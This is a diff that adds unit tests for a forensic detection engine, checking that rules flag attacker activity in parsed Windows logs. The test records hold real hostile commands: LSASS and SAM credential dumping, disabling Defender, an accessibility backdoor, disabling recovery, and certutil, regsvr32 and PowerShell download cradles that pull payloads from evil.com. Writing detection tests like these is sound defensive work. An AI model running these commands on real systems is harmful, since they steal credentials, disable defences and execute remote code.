@@ -7,17 +7,30 @@ import io
 from waeaa_ingestor.detection.engine import DetectionEngine
 from waeaa_ingestor.detection.models import Severity
 from waeaa_ingestor.detection.rules import (
+    AccessibilityBackdoorRule,
+    BcdeditRecoveryDisabledRule,
+    BloodHoundReconRule,
+    CertutilDownloadRule,
     CredentialDumpingRule,
+    DefenderTamperingRule,
     ExecutionFromTempRule,
     LinuxCronSuspiciousRule,
     LinuxReverseShellRule,
     LinuxShadowAccessRule,
     LogClearingRule,
     LOLBinsExecutionRule,
+    LsassMemoryDumpRule,
+    MshtaExecutionRule,
+    PowerShellDownloadCradleRule,
     PowerShellSuspiciousRule,
     RegistryRunPersistenceRule,
+    Regsvr32ScrobjRule,
+    SamHiveExportRule,
     ShadowCopyDeletionRule,
     SuspiciousServiceRule,
+    SuspiciousUsbInsertionRule,
+    WerExploitCrashRule,
+    get_default_detection_rules,
 )
 from waeaa_ingestor.parsers.base import ParsedRecord
 
@@ -253,3 +266,183 @@ def test_detection_engine_analyze_and_export() -> None:
     csv_buf = io.StringIO()
     engine.write_csv(findings, csv_buf)
     assert "T1059.004" in csv_buf.getvalue()
+
+
+def test_lsass_memory_dump_rule() -> None:
+    rule = LsassMemoryDumpRule()
+    rec = ParsedRecord(
+        artefact_type="PowerShellHistory",
+        source_file="ConsoleHost_history.txt",
+        timestamp_utc="2026-10-22T09:10:00Z",
+        action="CommandExecution",
+        summary="rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump 672 C:\\temp\\lsass.dmp full",
+    )
+    finding = rule.evaluate(rec)
+    assert finding is not None
+    assert finding.severity == Severity.CRITICAL
+    assert finding.mitre.technique_id == "T1003.001"
+
+
+def test_sam_hive_export_rule() -> None:
+    rule = SamHiveExportRule()
+    rec = ParsedRecord(
+        artefact_type="ProcessExecution",
+        source_file="Security.evtx",
+        timestamp_utc="2026-10-22T09:12:00Z",
+        action="ProcessCreated",
+        summary="reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.save",
+    )
+    finding = rule.evaluate(rec)
+    assert finding is not None
+    assert finding.severity == Severity.HIGH
+    assert finding.mitre.technique_id == "T1003.002"
+
+
+def test_defender_tampering_rule() -> None:
+    rule = DefenderTamperingRule()
+    rec = ParsedRecord(
+        artefact_type="PowerShellHistory",
+        source_file="ConsoleHost_history.txt",
+        timestamp_utc="2026-10-22T09:15:00Z",
+        action="CommandExecution",
+        summary="Set-MpPreference -DisableRealtimeMonitoring $true",
+    )
+    finding = rule.evaluate(rec)
+    assert finding is not None
+    assert finding.severity == Severity.CRITICAL
+
+
+def test_accessibility_backdoor_rule() -> None:
+    rule = AccessibilityBackdoorRule()
+    rec = ParsedRecord(
+        artefact_type="RegistryHive",
+        source_file="SOFTWARE",
+        timestamp_utc="2026-10-22T09:20:00Z",
+        action="RegistryKeyModified",
+        summary=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe [Debugger=cmd.exe]",
+    )
+    finding = rule.evaluate(rec)
+    assert finding is not None
+    assert finding.severity == Severity.CRITICAL
+    assert finding.mitre.technique_id == "T1546.008"
+
+
+def test_mshta_execution_rule() -> None:
+    rule = MshtaExecutionRule()
+    rec = ParsedRecord(
+        artefact_type="Prefetch",
+        source_file="MSHTA.EXE-1234.pf",
+        timestamp_utc="2026-10-22T09:25:00Z",
+        action="ProcessExecution",
+        summary="mshta.exe javascript:alert('pwn')",
+    )
+    finding = rule.evaluate(rec)
+    assert finding is not None
+    assert finding.mitre.technique_id == "T1218.005"
+
+
+def test_certutil_download_rule() -> None:
+    rule = CertutilDownloadRule()
+    rec = ParsedRecord(
+        artefact_type="ProcessExecution",
+        source_file="Security.evtx",
+        timestamp_utc="2026-10-22T09:30:00Z",
+        action="ProcessCreated",
+        summary="certutil.exe -urlcache -split -f http://evil.com/beacon.exe beacon.exe",
+    )
+    finding = rule.evaluate(rec)
+    assert finding is not None
+    assert finding.mitre.technique_id == "T1105"
+
+
+def test_regsvr32_scrobj_rule() -> None:
+    rule = Regsvr32ScrobjRule()
+    rec = ParsedRecord(
+        artefact_type="ProcessExecution",
+        source_file="Security.evtx",
+        timestamp_utc="2026-10-22T09:35:00Z",
+        action="ProcessCreated",
+        summary="regsvr32.exe /s /u /i:http://evil.com/script.sct scrobj.dll",
+    )
+    finding = rule.evaluate(rec)
+    assert finding is not None
+    assert finding.severity == Severity.CRITICAL
+
+
+def test_powershell_download_cradle_rule() -> None:
+    rule = PowerShellDownloadCradleRule()
+    rec = ParsedRecord(
+        artefact_type="PowerShellHistory",
+        source_file="ConsoleHost_history.txt",
+        timestamp_utc="2026-10-22T09:40:00Z",
+        action="CommandExecution",
+        summary="IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')",
+    )
+    finding = rule.evaluate(rec)
+    assert finding is not None
+    assert finding.severity == Severity.CRITICAL
+
+
+def test_bloodhound_recon_rule() -> None:
+    rule = BloodHoundReconRule()
+    rec = ParsedRecord(
+        artefact_type="ProcessExecution",
+        source_file="Security.evtx",
+        timestamp_utc="2026-10-22T09:45:00Z",
+        action="ProcessCreated",
+        summary="SharpHound.exe -c All,DCOnly --domain corp.local",
+    )
+    finding = rule.evaluate(rec)
+    assert finding is not None
+    assert finding.severity == Severity.CRITICAL
+
+
+def test_bcdedit_recovery_rule() -> None:
+    rule = BcdeditRecoveryDisabledRule()
+    rec = ParsedRecord(
+        artefact_type="ProcessExecution",
+        source_file="Security.evtx",
+        timestamp_utc="2026-10-22T09:50:00Z",
+        action="ProcessCreated",
+        summary="bcdedit.exe /set {default} recoveryenabled No",
+    )
+    finding = rule.evaluate(rec)
+    assert finding is not None
+    assert finding.severity == Severity.CRITICAL
+
+
+def test_usb_device_inserted_rule() -> None:
+    rule = SuspiciousUsbInsertionRule()
+    rec = ParsedRecord(
+        artefact_type="USBDevice",
+        source_file="setupapi.dev.log",
+        timestamp_utc="2026-10-22T09:55:00Z",
+        action="USB_DEVICE_INSTALL",
+        summary="USB Device Installed: VID_0781 PID_5583",
+        details={"vendor_id": "0781", "product_id": "5583"},
+    )
+    finding = rule.evaluate(rec)
+    assert finding is not None
+    assert finding.mitre.technique_id == "T1052.001"
+
+
+def test_wer_exploit_crash_rule() -> None:
+    rule = WerExploitCrashRule()
+    rec = ParsedRecord(
+        artefact_type="wer_crash",
+        source_file="Report.wer",
+        timestamp_utc="2026-10-22T09:58:00Z",
+        action="PROCESS_CRASH",
+        summary="Application crash detected: lsass.exe",
+        process_name="lsass.exe",
+        details={"exception_code": "c0000005"},
+    )
+    finding = rule.evaluate(rec)
+    assert finding is not None
+    assert finding.severity == Severity.HIGH
+
+
+def test_default_detection_rules_count() -> None:
+    rules = get_default_detection_rules()
+    assert len(rules) >= 45
+
